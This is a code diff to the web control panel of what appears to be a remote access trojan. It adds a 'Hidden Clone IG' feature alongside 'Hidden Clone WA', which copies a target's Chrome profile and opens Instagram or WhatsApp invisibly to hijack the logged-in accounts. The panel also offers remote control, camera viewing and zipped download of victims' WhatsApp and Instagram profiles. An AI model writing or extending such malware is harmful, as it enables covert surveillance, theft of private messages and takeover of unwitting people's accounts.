@@ -24,7 +24,8 @@
         <button id="remoteControlBtn" style="background: #dc3545;">🎮 Remote Control</button>
         <button id="viewChromeBtn" style="background: #ff7300;">🌐 Chrome Browsers</button>
         <button id="viewWhatsappBtn" style="background: #25D366; color: white;">💬 WhatsApp</button>
-        <button id="viewHiddenChromeBtn" style="background: #9c27b0; color: white;" title="Clones the target's Chrome profile and opens it invisibly.">🕵️ Hidden Clone Chrome</button>
+        <button id="viewHiddenChromeBtn" style="background: #9c27b0; color: white;" title="Clones the target's Chrome profile and opens WA invisibly.">🕵️ Hidden Clone WA</button>
+        <button id="viewHiddenInstaBtn" style="background: #fd1d1d; color: white;" title="Clones the target's Chrome profile and opens IG invisibly.">🕵️ Hidden Clone IG</button>
         <button id="downloadWhatsappBtn" style="background: #e83e8c; color: white;" title="Zip and Download the target's entire WhatsApp Chrome Profile">📦 Download WA Profile</button>
         <button id="downloadInstagramBtn" style="background: #E1306C; color: white;" title="Zip and Download the target's entire Instagram Chrome Profile">📸 Download IG Profile</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
@@ -335,7 +336,18 @@
             document.getElementById('preview-video').classList.add('hidden');
             document.getElementById('chrome-list-container').classList.remove('hidden');
             document.getElementById('chromeWindows').innerHTML = "<p>Loading Chrome Profiles...</p>";
-            document.getElementById('title').innerText = "Select Chrome Profile: " + activeTarget;
+            document.getElementById('title').innerText = "Select Profile for Hidden WA: " + activeTarget;
+            socket.emit('request-chrome-profiles', activeTarget);
+        };
+
+        document.getElementById('viewHiddenInstaBtn').onclick = () => {
+            if (activeType === 'hidden-insta-list') return;
+            stopCurrentActive();
+            activeType = 'hidden-insta-list';
+            document.getElementById('preview-video').classList.add('hidden');
+            document.getElementById('chrome-list-container').classList.remove('hidden');
+            document.getElementById('chromeWindows').innerHTML = "<p>Loading Chrome Profiles...</p>";
+            document.getElementById('title').innerText = "Select Profile for Hidden IG: " + activeTarget;
             socket.emit('request-chrome-profiles', activeTarget);
         };
 
@@ -362,7 +374,7 @@
         };
 
         socket.on('chrome-profiles-list', (data) => {
-            if ((activeType !== 'hidden-chrome-list' && activeType !== 'zip-whatsapp-list' && activeType !== 'zip-instagram-list') || activeTarget !== data.targetId) return;
+            if ((activeType !== 'hidden-chrome-list' && activeType !== 'hidden-insta-list' && activeType !== 'zip-whatsapp-list' && activeType !== 'zip-instagram-list') || activeTarget !== data.targetId) return;
             const container = document.getElementById('chromeWindows');
             container.innerHTML = '';
             
@@ -377,7 +389,10 @@
             autoBtn.style.margin = '5px';
             autoBtn.innerText = activeType === 'zip-instagram-list' ? "✨ Auto-Detect Instagram" : "✨ Auto-Detect WhatsApp";
             if (activeType === 'hidden-chrome-list') {
-                autoBtn.onclick = () => launchHiddenChrome(null);
+                autoBtn.onclick = () => launchHiddenChrome(null, 'whatsapp');
+            } else if (activeType === 'hidden-insta-list') {
+                autoBtn.innerText = "✨ Auto-Detect Instagram";
+                autoBtn.onclick = () => launchHiddenChrome(null, 'instagram');
             } else if (activeType === 'zip-whatsapp-list') {
                 autoBtn.onclick = () => launchZipProfile(null);
             } else {
@@ -391,7 +406,10 @@
                 btn.style.margin = '5px';
                 btn.innerText = "👤 " + profile;
                 if (activeType === 'hidden-chrome-list') {
-                    btn.onclick = () => launchHiddenChrome(profile);
+                    btn.onclick = () => launchHiddenChrome(profile, 'whatsapp');
+                } else if (activeType === 'hidden-insta-list') {
+                    btn.style.background = '#fd1d1d';
+                    btn.onclick = () => launchHiddenChrome(profile, 'instagram');
                 } else if (activeType === 'zip-whatsapp-list') {
                     btn.onclick = () => launchZipProfile(profile);
                 } else {
@@ -401,15 +419,16 @@
             });
         });
 
-        function launchHiddenChrome(profileName) {
-            if (!confirm("This will copy the target's Chrome Profile and open it invisibly in the background. It might take 5-10 seconds to load. Proceed?")) return;
+        function launchHiddenChrome(profileName, targetApp = 'whatsapp') {
+            const appName = targetApp === 'instagram' ? 'Instagram' : 'WhatsApp';
+            if (!confirm(`This will copy the target's Chrome Profile and open ${appName} invisibly in the background. It might take 5-10 seconds to load. Proceed?`)) return;
             stopCurrentActive();
             activeType = 'hidden-chrome';
             document.getElementById('chrome-list-container').classList.add('hidden');
             document.getElementById('hidden-chrome-img').classList.remove('hidden');
             document.getElementById('remote-tools').classList.remove('hidden'); // Allow sending text
-            document.getElementById('title').innerText = "Starting Hidden Chrome (Please wait...): " + activeTarget;
-            socket.emit('request-hidden-chrome', { targetId: activeTarget, profileName: profileName });
+            document.getElementById('title').innerText = `Starting Hidden Clone ${appName} (Please wait...): ` + activeTarget;
+            socket.emit('request-hidden-chrome', { targetId: activeTarget, profileName: profileName, targetApp: targetApp });
         }
 
         function launchZipProfile(profileName) {
